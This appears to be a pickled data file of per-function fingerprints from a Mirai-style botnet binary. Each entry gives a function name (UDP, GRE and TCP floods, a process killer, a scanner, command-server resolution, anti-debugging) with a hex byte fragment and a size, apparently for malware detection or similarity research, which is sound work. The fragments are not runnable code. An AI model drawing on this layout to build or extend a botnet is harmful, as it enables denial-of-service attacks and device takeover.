(lp0
(S'_init'
p1
S'06005cb89903'
p2
L140L
tp3
a(S'_ftext'
p4
S'0600d09903'
p5
L188L
tp6
a(S'frame_dummy'
p7
S'0600149c27219903'
p8
L128L
tp9
a(S'__start'
p10
S'21e00111000000849f03f800c08fa627f8ff24e8bd8f000000af18bd8f0000f8200000'
p11
L100L
tp12
a(S'attack_app_http'
p13
S'0600209903bdafb0beafa8b6a451b5a051b39851b29451b19051b018bcaf218470a4afffd1212021e0158103380000212021001406248000000920b0e718bc002002280200248103380000212021001600248000000920b4e718bc0020022802002481030024002120210007002481030724006051a2272100c8000009200106240000000a1200008f0000f82021c000ea008f0000f82021e018bc280a000044'
p14
L11604L
tp15
a(S'attack_get_opt_str'
p16
S'ff8413800030a200000000050000620600086300031000000000252160001000000300'
p17
L96L
tp18
a(S'attack_get_opt_ip'
p19
S'06006c88e0bdaf18b010bc00004c810338000000004c'
p20
L112L
tp21
a(S'attack_get_opt_int'
p22
S'0600fc87e0bdaf18b010bc00004c81033800002140000009200a05'
p23
L112L
tp24
a(S'attack_start'
p25
S'06008c9903'
p26
L440L
tp27
a(S'attack_parse'
p28
S'0600d49c2721990300af5400af4c00af4400af3cb138b018bc00a21480fcff10ff8000050000ff8000b000101400028f0000f8201805'
p29
L872L
tp30
a(S'attack_kill_all'
p31
S'06006c'
p32
L140L
tp33
a(S'add_attack'
p34
S'0600e09c27219903'
p35
L184L
tp36
a(S'attack_init'
p37
S'0600289903'
p38
L296L
tp39
a(S'attack_gre_eth'
p40
S'0600009903bdaf9000af88b684b580af7cb378b274b170b018bcaf2184580074998f0000f8200405'
p41
L2324L
tp42
a(S'attack_gre_ip'
p43
S'057627219903bdaf80af7cb778b674b570b46c00af00af18bcaf21844c0074998f0000f8200405'
p44
L2104L
tp45
a(S'attack_tcp_stomp'
p46
S'056e9c27219903'
p47
L2892L
tp48
a(S'attack_tcp_ack'
p49
S'056358'
p50
L2432L
tp51
a(S'attack_tcp_syn'
p52
S'05599c27219903bdaf9000af88b684b580af7cb378b274b170b018bcaf21845c0074998f0000f8200405'
p53
L2332L
tp54
a(S'attack_udp_plain'
p55
S'05509c2721990300af5c00af5400af4c00af4400af10bc0080ff933000302074998f0000f8200405'
p56
L996L
tp57
a(S'attack_udp_generic'
p58
S'054c9c2721990300af6c00af00af5c00af5400af18bcaf2184400074998f0000f8200405'
p59
L1692L
tp60
a(S'attack_udp_vse'
p61
S'05469c2721990300af5c00af5400af4c00af4400af18bcaf218430a4afffd174998f0000f8200405'
p62
L1572L
tp63
a(S'attack_udp_dns'
p64
S'05409c27219903bdafa8beafa008af9408af8cb188b018bcaf218478a4afffd174998f0000f8200405'
p65
L2368L
tp66
a(S'checksum_generic'
p67
S'02a2141800000018'
p68
L96L
tp69
a(S'checksum_tcpudp'
p70
S'210084002800'
p71
L180L
tp72
a(S'mem_exists'
p73
S'2aa700401440000f10ff241001008000036200000600104000010801840003002400'
p74
L96L
tp75
a(S'killer_kill'
p76
S'05359903'
p77
L72L
tp78
a(S'killer_kill_by_port'
p79
S'0535990322af22af5c22af5422af4c22af10bc3000c800000920000624002100c800000920000624002100c800000920010624002100c80000092010062400ff1000b125008f0000f820212010bc008f0000f820212010bc2400000029a200229300002ca2a329a2a300000920060010bc00'
p80
L2352L
tp81
a(S'killer_init'
p82
S'052b'
p83
L3040L
tp84
a(S'anti_gdb_entry'
p85
S'05201c'
p86
L36L
tp87
a(S'teardown_connection'
p88
S'051f9c27219903'
p89
L120L
tp90
a(S'ensure_single_instance'
p91
S'051f9c2721990300af38b018bc240024008f0000f820210018bc0080000278'
p92
L592L
tp93
a(S'main'
p94
S'051d9903f9bdaf30beaf28b624b520b41cb318b214b110b018bcaf00a48c998f0000f82021a0'
p95
L3660L
tp96
a(S'resolve_cnc_addr'
p97
S'050e9c27219903'
p98
L336L
tp99
a(S'rand_next'
p100
S'050d9903803c8c0000120080d4623cac1800d88c00003cac1800dc8c00003cac02050018280000033cac'
p101
L124L
tp102
a(S'rand_str'
p103
S'050d9903'
p104
L184L
tp105
a(S'rand_alphastr'
p106
S'050c2721990300af4c00af4400af10bc008000002c240024008cc38c008cc500ac08e40ce510'
p107
L336L
tp108
a(S'rand_init'
p109
S'050bd8bdaf1cb118b010bc8f0000f820210010bc008000000920d0ac10bc000000f82021bc0080dc000920d43000001800d8acd423101800dcac20bf'
p110
L196L
tp111
a(S'resolv_skip_name'
p112
S'010200ac2100'
p113
L136L
tp114
a(S'resolv_entries_free'
p115
S'0509e0bdaf18b010bc108000000700000000f820000010bc000000f820210010bc'
p116
L112L
tp117
a(S'resolv_domain_to_hostname'
p118
S'0509d8bdaf1cb118b010bc00888f0000f82021a08f0001452410000010002400'
p119
L184L
tp120
a(S'resolv_lookup'
p121
S'050808bdaf10afe810afdcb3d8b2d4b1d0b018bc000074998f0000f8200805'
p122
L1452L
tp123
a(S'consume_any_prompt'
p124
S'18'
p125
L180L
tp126
a(S'can_consume'
p127
S'1c'
p128
L28L
tp129
a(S'scanner_kill'
p130
S'0502e0bdaf10bc8f000000'
p131
L72L
tp132
a(S'deobf'
p133
S'0501d0bdaf24b320b21cb118b010bc008f0000f82021bcaee0998f0000f8200144240021468e202100d800092001'
p134
L216L
tp135
a(S'add_auth_entry'
p136
S'0501c0273cbfaf34b530b42cb328b224b120b010bc00a800ff3080000000458e0000298e998f0000f82010a52400002200000002216002008f0000b724c8f82021600200ae00428e008e11001018a30043a00000002221a002f8202160020000428e008e11001018a3000000232143008f000000000000448e008e19216200a20010a40184000000a0b43cbf'
p137
L408L
tp138
a(S'setup_connection'
p139
S'05ffc830bfaf28b010bc0000af20a0af04840000000920000010bc24008f0000f820210010bc240004221c243c998f0000f82000058f30210003058f0000f820210010bc02058f0000f82080340018a28e0000a29600001aa28f000000000008220c2218a52748830920100624002cb128b008e038'
p140
L328L
tp141
a(S'recv_strip_null'
p142
S'05'
p143
L120L
tp144
a(S'scanner_init'
p145
S'05fd9c2721990307bfaf4c07b74807b64407b54007b43cb338b234b130b018bc8f0000f820000018bc0081ac'
p146
L8940L
tp147
a(S'table_retrieve_val'
p148
S'05dac000a000'
p149
L52L
tp150
a(S'toggle_obf'
p151
S'05daff84c0000021'
p152
L232L
tp153
a(S'table_lock_val'
p154
S'05d9e0bdaf10bc8f0000390920ff8410bc8f00000003'
p155
L64L
tp156
a(S'table_unlock_val'
p157
S'05d9e0bdaf10bc8f0000390920ff8410bc8f00000003'
p158
L64L
tp159
a(S'add_entry'
p160
S'05d9d0bdaf24b320b21cb118b010bc008800008f0000f82021c00021400028d8000920212010bc0000211228bf'
p161
L156L
tp162
a(S'table_init'
p163
S'05d8e0bdaf18b010bc248088a52480d05024c8f8201e0024001c859ca524c8f820020624001c85a0c8f8201d001c85b8c8f820020624001c85bcc8f8200f24001c85cca524c8f8201d001c85eca524c8f820070024001c85f4a524c8f82005001c85fca524c8f8200b0624001c8508a524c8f820040624001c8510a524c8f820070024001c8518a524c8f820080624001c8524a524c8f8200d001c8534a524c8f8200a0624001c85402fa524c8f8200a0624001c854c2fa524c8f820210624001c8570a524c8f820080624001c857ca524c8f8200b0624001c8588a524c8f820060024001c85902fa524c8f820070024001c85982fa524c8f820070024001c85a0c8f820030624001c85a42fa524c8f820130624001c85b8c8f820180624001c85d4a524c8f820090624001c85e0a524c8f820100624001c85f42fa524c8f820160024001c850ca524c8f82015001c8524a524c8f820110624001c8538a524c8f8200c0624001c85483002f820170024001c85603002f820530024001c85b4a524c8f820200624001c85d8a524c8f820300624001c850ca524c8f8200c0624001c851ca524c8f820090624001c8528a524c8f8200a0624001c8534a524c8f8200c0624001c85443102f820100624001c85583102f820130624001c856c3102f820080624001c85543002f8200b0624001c8578a524c8f8200c0624001c8588a524c8f820120624001c859c3102f820190624001c85b8c8f8206f0024001c8528a524c8f8206f0024001c85983202f8206e0024001c8508a524c8f8206e0024001c8578a524c8f8207506240018b008e020'
p164
L1656L
tp165
a(S'util_strlen'
p166
S'00'
p167
L44L
tp168
a(S'util_strncmp'
p169
S'05d1d0bdaf24b320b21cb118b010bc0090a08f0000f82021bc008f0000f8202140020010002a510000'
p170
L196L
tp171
a(S'util_strcmp'
p172
S'05d1d8bdaf20b21cb118b010bc008f0000f82021bc008f0000f820212010bc162100070010ff0043'
p173
L172L
tp174
a(S'util_memcpy'
p175
S'070010380010000001e7fbff140008e00000'
p176
L40L
tp177
a(S'util_strcpy'
p178
S'05d0d8bdaf20b21cb118b010bc00800000092021a0'
p179
L124L
tp180
a(S'util_zero'
p181
S'06000020014224ff0000000300'
p182
L36L
tp183
a(S'util_itoa'
p184
S'05cf9c2721990300af10bc108030800024002400a32100201a800024001000244000200624001400001800000340100000001000370021e60043a01b850d2000ff2400110000182400100001'
p185
L260L
tp186
a(S'util_memsearch'
p187
S'2aa7004014508000004800210a210100000000060025010808e001020108000008e0'
p188
L96L
tp189
a(S'util_stristr'
p190
S'05ce9c27219903'
p191
L208L
tp192
a(S'util_atoi'
p193
S'20072400240024000030fcff0184ff0000f8ff00004800103880020010002b0200000000e6430010002450a014000d5800120040002100ffc330ffff4230000340100010ff24001a422c00370024ffff423000184010021800101440100000000410014014000000152a6303401000000010ff24100040430000100024ff24001000000003800000001080'
p194
L384L
tp195
a(S'util_fdgets'
p196
S'05cb9c27219903'
p197
L216L
tp198
a(S'util_local_addr'
p199
S'05cb9c27219903'
p200
L244L
tp201
a(S'fcntl'
p202
S'05ca219903'
p203
L136L
tp204
a(S'fcntl64'
p205
S'05c99c27219903'
p206
L104L
tp207
a(S'chdir'
p208
S'05c99c27219903'
p209
L88L
tp210
a(S'close'
p211
S'05c8e003'
p212
L84L
tp213
a(S'fork'
p214
S'05c8e003'
p215
L84L
tp216
a(S'getpid'
p217
S'05c8e003'
p218
L84L
tp219
a(S'getppid'
p220
S'05'
p221
L84L
tp222
a(S'ioctl'
p223
S'05'
p224
L104L
tp225
a(S'kill'
p226
S'05'
p227
L88L
tp228
a(S'open'
p229
S'05'
p230
L124L
tp231
a(S'creat'
p232
S'05c52499'
p233
L28L
tp234
a(S'prctl'
p235
S'05c5d8bdaf21a0af18b010bc2738c2'
p236
L120L
tp237
a(S'read'
p238
S'05c5e0bdaf18b010bc2400008100f820000010bcac'
p239
L84L
tp240
a(S'readlink'
p241
S'05c4e0bdaf18b010bc2400008100f820000010bcac'
p242
L84L
tp243
a(S'select'
p244
S'05c4d8bdaf21a0af18b010bc2738c2'
p245
L120L
tp246
a(S'setsid'
p247
S'05c4e0bdaf18b010bc2400008100f820000010bcac'
p248
L84L
tp249
a(S'sigprocmask'
p250
S'05c39c27219903'
p251
L148L
tp252
a(S'time'
p253
S'05c39c27219903'
p254
L84L
tp255
a(S'unlink'
p256
S'05c2219903'
p257
L84L
tp258
a(S'write'
p259
S'05c2219903'
p260
L84L
tp261
a(S'closedir'
p262
S'05c1'
p263
L292L
tp264
a(S'opendir'
p265
S'05c0'
p266
L408L
tp267
a(S'readdir'
p268
S'05bf9903'
p269
L256L
tp270
a(S'__errno_location'
p271
S'05be9903800000'
p272
L24L
tp273
a(S'clock'
p274
S'05be9903'
p275
L108L
tp276
a(S'memset'
p277
S'08c928001505000044050040040308030023c885070030001138003800300100fdffac04c80023c8850018380000'
p278
L144L
tp279
a(S'memmove'
p280
S'05bd9903'
p281
L816L
tp282
a(S'inet_addr'
p283
S'05b99903'
p284
L72L
tp285
a(S'accept'
p286
S'05b99903'
p287
L84L
tp288
a(S'bind'
p289
S'05b99903'
p290
L84L
tp291
a(S'connect'
p292
S'05b89903'
p293
L84L
tp294
a(S'getsockname'
p295
S'05b89903'
p296
L84L
tp297
a(S'getsockopt'
p298
S'05b89903'
p299
L120L
tp300
a(S'listen'
p301
S'05b727219903'
p302
L84L
tp303
a(S'recv'
p304
S'05b727219903'
p305
L84L
tp306
a(S'recvfrom'
p307
S'05b627219903'
p308
L128L
tp309
a(S'send'
p310
S'05b627219903'
p311
L84L
tp312
a(S'sendto'
p313
S'05b527219903'
p314
L128L
tp315
a(S'setsockopt'
p316
S'05b527219903'
p317
L120L
tp318
a(S'socket'
p319
S'05b427219903'
p320
L84L
tp321
a(S'raise'
p322
S'05b427219903'
p323
L76L
tp324
a(S'sigaddset'
p325
S'05b427219903'
p326
L104L
tp327
a(S'sigemptyset'
p328
S'05b327219903'
p329
L60L
tp330
a(S'signal'
p331
S'05b327219903'
p332
L252L
tp333
a(S'__sigismember'
p334
S''
p335
L40L
tp336
a(S'__sigaddset'
p337
g335
L44L
tp338
a(S'__sigdelset'
p339
g335
L48L
tp340
a(S'malloc'
p341
S'05b127219903'
p342
L492L
tp343
a(S'calloc'
p344
S'05b027219903'
p345
L180L
tp346
a(S'free'
p347
S'05af9c27219903'
p348
L396L
tp349
a(S'realloc'
p350
S'05ad9c27219903'
p351
L472L
tp352
a(S'__heap_alloc'
p353
S'00a22400244300c20000000c0624001000000000002be61a4014002410000023e6048c0000c0000000000008c200046810000030000021e002000088100c42240003008c0000ff210008e00000'
p354
L188L
tp355
a(S'__heap_alloc_at'
p356
S'0083'
p357
L184L
tp358
a(S'__heap_link_free_area'
p359
S'04a7ac03c00010c50010000000ac08e00000'
p360
L44L
tp361
a(S'__heap_link_free_area_after'
p362
S'03c000000010c50003'
p363
L28L
tp364
a(S'__heap_free'
p365
S'05aa9c27219903'
p366
L364L
tp367
a(S'atol'
p368
S'05a8272199038008200a06'
p369
L28L
tp370
a(S'strtol'
p371
S'05a827219903810300'
p372
L28L
tp373
a(S'_stdlib_strto_l'
p374
S'05a827219903'
p375
L592L
tp376
a(S'exit'
p377
S'05a69c27219903'
p378
L240L
tp379
a(S'sleep'
p380
S'05a59c27219903'
p381
L564L
tp382
a(S'__uClibc_fini'
p383
S'05a29903'
p384
L196L
tp385
a(S'__pthread_return_0'
p386
S'08e02100'
p387
L8L
tp388
a(S'_pthread_cleanup_push_defer'
p389
S'08e00000'
p390
L8L
tp391
a(S'__check_one_fd'
p392
S'05a19903'
p393
L136L
tp394
a(S'__uClibc_init'
p395
S'05a19903'
p396
L140L
tp397
a(S'__uClibc_main'
p398
S'05a09903bdafa400af9c00af9400af10bc0090c00000'
p399
L872L
tp400
a(S'sigaction'
p401
S'059d9c2721990300af5c00af10bc0088009080'
p402
L232L
tp403
a(S'__syscall_rt_sigaction'
p404
S'059c9c27219903'
p405
L84L
tp406
a(S'_exit'
p407
S'059c9c27219903'
p408
L80L
tp409
a(S'fstat'
p410
S'059b9c27219903bdafac00af10bc2721c0102400008100f820000010bcac0800'
p411
L140L
tp412
a(S'__getdents'
p413
S'059b9c27219903'
p414
L192L
tp415
a(S'__getdents64'
p416
S'059ab80003af3cb738b634b530b42cb328b224b120b018bc2410001000e8b321c000af216002020000001090400081030000008f00'
p417
L456L
tp418
a(S'getegid'
p419
S'05989c27219903'
p420
L88L
tp421
a(S'geteuid'
p422
S'05989c27219903'
p423
L88L
tp424
a(S'getgid'
p425
S'05989c27219903'
p426
L84L
tp427
a(S'getuid'
p428
S'05979c27219903'
p429
L84L
tp430
a(S'lseek64'
p431
S'05979c27219903'
p432
L164L
tp433
a(S'nanosleep'
p434
S'05969c27219903'
p435
L84L
tp436
a(S'sbrk'
p437
S'05969c27219903'
p438
L144L
tp439
a(S'times'
p440
S'05959c27219903'
p441
L84L
tp442
a(S'__xstat64_conv'
p443
S'05959c27219903'
p444
L288L
tp445
a(S'__xstat_conv'
p446
S'05949c27219903'
p447
L276L
tp448
a(S'memcpy'
p449
S'08c80040a4000031001503290530000000000000300011380038003001008c008c0018ae8caf8c00e088ffacfff8ff14ff30001138003800300100240014ff18380000240014ff0300003803e70600103000008828b803c8c8e500a988840014ff1030'
p450
L308L
tp451
a(S'inet_aton'
p452
S'05919c272199038058a0'
p453
L280L
tp454
a(S'abort'
p455
S'05909c27219903'
p456
L428L
tp457
a(S'_dl_aux_init'
p458
S'058e1c83000043ac2c83e00043ac'
p459
L44L
tp460
a(S'brk'
p461
S'058ee0bdaf10bc'
p462
L112L
tp463
a(S'__do_global_ctors_aux'
p464
S'058ed8bdaf1cb118b010bc'
p465
L108L
tp466
a(S'_fini'
p467
S'058de0bdaf1cbfaf011100008d200020390920000010bc00bf000003'
p468
L92L
tp469
a.